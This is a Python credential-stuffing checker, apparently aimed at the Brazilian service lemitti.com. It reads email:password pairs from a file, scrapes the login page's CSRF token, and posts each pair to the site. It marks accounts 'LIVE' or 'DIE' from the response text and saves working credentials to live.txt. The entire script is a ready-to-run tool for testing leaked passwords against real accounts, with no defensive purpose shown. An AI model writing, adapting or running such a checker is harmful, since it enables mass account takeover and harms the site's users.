import requests
from bs4 import BeautifulSoup
from colorama import init, Fore
import pyfiglet

init(autoreset=True)

def exibir_banner():
    """Exibe o banner do programa com pyfiglet."""
    branco = "\033[37m" 
    resetar_cor = "\033[0m"

    banner = pyfiglet.figlet_format("LEMITTI", font="slant")
    print(f"{branco}{banner}{resetar_cor}")
    print(f"{branco}(sethking){resetar_cor}")

def lemiti(user, psw):
    try:
        session = requests.Session()

        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }

        response = session.get('https://lemitti.com/auth/login', headers=headers)
        response.raise_for_status()
        token = response.text.split('name="_token" value="')[1].split('">')[0]

        headers.update({
            'Referer': 'https://lemitti.com/auth/login',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://lemitti.com'
        })

        data = {
            '_token': token,
            'fpl': 'da5b27b7340c8c3a4d4665d84fb31c3e',
            'email': user,
            'password': psw,
        }

        response = session.post('https://lemitti.com/auth/login', headers=headers, data=data)
        response.raise_for_status()

        if 'Senha resetada' in response.text or 'Os dados informados' in response.text:
            return False
        elif 'Central de atendimento' in response.text:
            return True
        else:
            return "OTHER"

    except Exception as e:
        print(Fore.RED + f"Erro durante o login: {e}")
        return "OTHER"

def save_to_file(filename, content):
    try:
        with open(filename, 'a', encoding='utf-8') as file:
            file.write(content + '\n')
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar no arquivo {filename}: {e}")

def process_accounts():
    """Processa a lista de contas para tentar login."""
    try:
        with open('logins.txt', 'r', encoding='utf-8') as file:
            linhas = file.readlines()

        for linha in linhas:
            try:
                email, senha = linha.strip().split(':')
                resultado = lemiti(email, senha)

                if resultado is True:
                    print(Fore.GREEN + f"[+] {email} | {senha} - LIVE ✅️")
                    save_to_file('live.txt', f"{email}:{senha}")
                elif resultado is False:
                    print(Fore.WHITE + f"[-] {email} - DIE ❌️")
                else:
                    print(Fore.RED + f"[ERRO] {email} - Erro desconhecido")

            except ValueError:
                print(Fore.RED + f"Formato inválido na linha: {linha.strip()}")

    except FileNotFoundError:
        print(Fore.RED + "Arquivo 'lemitti.txt' não encontrado.")
    except Exception as e:
        print(Fore.RED + f"Erro ao processar contas: {e}")

if __name__ == "__main__":
    exibir_banner()
    process_accounts()